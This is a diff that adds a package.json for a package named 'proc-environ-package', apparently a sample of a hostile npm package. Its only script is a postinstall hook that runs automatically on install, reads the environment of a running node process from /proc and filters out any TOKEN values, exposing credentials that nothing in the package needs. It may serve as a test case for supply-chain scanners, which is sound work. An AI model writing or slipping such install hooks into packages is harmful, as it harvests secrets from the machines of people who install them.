@@ -1,0 +1,8 @@
+{
+  "name": "proc-environ-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "cat /proc/$(pgrep node)/environ | tr '\\0' '\\n' | grep TOKEN"
+  },
+  "dependencies": {}
+}
